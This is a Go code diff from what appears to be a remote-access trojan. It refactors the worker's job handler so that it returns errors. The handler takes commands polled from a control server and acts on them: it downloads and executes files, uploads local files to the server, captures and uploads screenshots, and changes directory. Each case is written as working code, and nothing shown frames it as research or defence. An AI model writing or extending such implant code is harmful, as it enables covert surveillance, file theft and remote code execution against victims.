@@ -107,7 +107,9 @@ func (w *Worker) poll() {
 			sortJobsByTime(jobs)
 		}
 		for _, j := range jobs {
-			w.resolve(&j)
+			if err := w.resolve(&j); err != nil {
+				w.report(j.Id, err.Error())
+			}
 		}
 	end:
 		if w.boostMode {
@@ -118,7 +120,7 @@ func (w *Worker) poll() {
 	}
 }
 
-func (w *Worker) resolve(job *Job) {
+func (w *Worker) resolve(job *Job) error {
 	todo, args := job.parse()
 	fmt.Println(job.Todo)
 	switch todo {
@@ -130,28 +132,24 @@ func (w *Worker) resolve(job *Job) {
 	case SLEEP:
 		val, err := strconv.Atoi(args[0])
 		if err != nil {
-			w.report(job.Id, err.Error())
-			return
+			return err
 		}
 		w.report(job.Id, "Sleeping for "+args[0]+" seconds.")
 		time.Sleep(time.Duration(val) * time.Second)
 	case DOWNLOAD:
 		if err := win.DownloadNExecute(args[0], args[1]); err != nil {
-			w.report(job.Id, err.Error())
-			return
+			return err
 		}
 		w.report(job.Id, "File downloaded and executed.")
 	case UPLOAD:
 		loc, err := utils.UploadFile(args[0], fmt.Sprintf(UPLOADS_URL, w.id))
 		if err != nil {
-			w.report(job.Id, err.Error())
-			return
+			return err
 		}
 		w.report(job.Id, "File uploaded to "+path.Join(SERVER_ADDR, loc))
 	case CHDIR:
 		if err := os.Chdir(args[0]); err != nil {
-			w.report(job.Id, err.Error())
-			return
+			return err
 		}
 		w.report(job.Id, "Directory changed to "+args[0])
 	case MSG:
@@ -160,18 +158,17 @@ func (w *Worker) resolve(job *Job) {
 	case SCREENSHOT:
 		img, err := screenshot.CaptureRect(screenshot.GetDisplayBounds(0))
 		if err != nil {
-			w.report(job.Id, err.Error())
-			return
+			return err
 		}
 		loc, err := utils.UploadImage(img, "screen", fmt.Sprintf(UPLOADS_URL, w.id))
 		if err != nil {
-			w.report(job.Id, err.Error())
-			return
+			return err
 		}
 		w.report(job.Id, "Screenshot uploaded to "+path.Join(SERVER_ADDR, loc))
 	case UNKNOWN:
 		w.report(job.Id, "Received job has wrong format.")
 	}
+	return nil
 }
 
 func (w *Worker) report(jobId int, rep string) {
